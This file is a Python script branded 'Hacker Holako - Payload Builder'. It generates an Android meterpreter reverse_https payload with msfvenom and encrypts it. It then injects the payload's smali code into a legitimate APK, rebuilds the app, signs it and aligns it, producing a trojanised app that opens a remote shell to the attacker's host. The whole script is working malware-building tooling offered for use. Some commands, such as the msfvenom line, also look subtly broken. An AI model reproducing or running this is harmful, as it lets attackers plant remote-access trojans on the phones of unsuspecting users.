#!/usr/bin/env python3
import os
import sys
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import shutil

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

def print_banner():
    os.system("clear")
    print(f"""{BLUE}
╔════════════════════════════════════════╗
║     Hacker Holako - Payload Builder    ║
╚════════════════════════════════════════╝
{RESET}""")

def run_command(cmd):
    print(f"{YELLOW}[~] Running: {cmd}{RESET}")
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print(f"{RED}[-] Command failed: {cmd}{RESET}")
        sys.exit(1)

def encrypt_file(input_file, output_file, password):
    key = password.encode("utf-8").ljust(32, b"\0")[:32]
    iv = os.urandom(16)

    with open(input_file, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)

    print(f"{GREEN}[+] File encrypted and saved to {output_file}{RESET}")

def generate_java_decryptor(password, encrypted_filename, output_filename="Decryptor.java"):
    java_code = f"""
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;

public class Decryptor {{
    public static void main(String[] args) {{
        try {{
            String password = "{password}";
            byte[] key = new byte[32];
            byte[] pwdBytes = password.getBytes("UTF-8");
            System.arraycopy(pwdBytes, 0, key, 0, Math.min(pwdBytes.length, key.length));

            FileInputStream fis = new FileInputStream("{encrypted_filename}");
            byte[] iv = new byte[16];
            fis.read(iv);

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] tmp = new byte[4096];
            int n;
            while ((n = fis.read(tmp)) != -1) {{
                buffer.write(tmp, 0, n);
            }}
            fis.close();
            byte[] encryptedData = buffer.toByteArray();

            SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);

            byte[] decryptedData = cipher.doFinal(encryptedData);

            try (FileOutputStream fos = new FileOutputStream("decrypted_output.java")) {{
                fos.write(decryptedData);
            }}
            System.out.println("Decryption complete: decrypted_output.java");

        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""
    with open(output_filename, "w") as f:
        f.write(java_code)
    print(f"{GREEN}[+] Java decryptor code saved to {output_filename}{RESET}")

def copy_tree(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for root, dirs, files in os.walk(src):
        rel_path = os.path.relpath(root, src)
        dst_path = os.path.join(dst, rel_path)
        if not os.path.exists(dst_path):
            os.makedirs(dst_path)
        for file in files:
            shutil.copy(os.path.join(root, file), os.path.join(dst_path, file))

def main():
    print_banner()

    lhost = input(f"{BLUE}[?] Enter LHOST: {RESET}").strip()
    lport = input(f"{BLUE}[?] Enter LPORT: {RESET}").strip()

    payload_file = "payload.apk"
    msf_command = f"msfvenom -p android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} R > apk -o {payload_file}"
    run_command(msf_command)

    password = input(f"{BLUE}[?] Enter encryption password: {RESET}").strip()
    encrypted_file = "payload.enc"
    encrypt_file(payload_file, encrypted_file, password)

    generate_java_decryptor(password, encrypted_file)

    legit_apk = input(f"{BLUE}[?] Enter the path to the legit_apk APK: {RESET}").strip()
    if not os.path.isfile(legit_apk):
        print(f"{RED}[-] Legitimate APK not found!{RESET}")
        return

    print(f"{YELLOW}[~] Decompiling legitimate APK...{RESET}")
    run_command(f"apktool d -f {legit_apk} -o legit_src")

    print(f"{YELLOW}[~] Decompiling payload JAR to smali...{RESET}")
    if os.path.exists("payload_smali"):
        shutil.rmtree("payload_smali")
    os.makedirs("payload_smali", exist_ok=True)
    run_command(f"baksmali disassemble {payload_file} -o payload_smali")

    print(f"{YELLOW}[~] Merging payload smali into legitimate APK smali folder...{RESET}")
    copy_tree("payload_smali", "legit_src/smali")

    print(f"{YELLOW}[~] Building merged APK...{RESET}")
    run_command("apktool b legit_src -o merged.apk")

    if not os.path.exists("mykey.keystore"):
        print(f"{YELLOW}[~] Generating keystore...{RESET}")
        run_command('keytool -genkey -v -keystore mykey.keystore -alias alias_name '
                    '-keyalg RSA -keysize 2048 -validity 10000 '
                    '-storepass password -keypass password '
                    '-dname "CN=Holako, OU=Dev, O=Hackers, L=Cairo, S=Cairo, C=EG"')

    print(f"{YELLOW}[~] Signing APK...{RESET}")
    run_command("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 "
                "-keystore mykey.keystore -storepass password "
                "-keypass password merged.apk alias_name")

    print(f"{YELLOW}[~] Aligning APK...{RESET}")
    run_command("zipalign -v 4 merged.apk final_signed.apk")

    print(f"{GREEN}[+] Final signed APK saved as final_signed.apk{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Process interrupted by user.{RESET}")
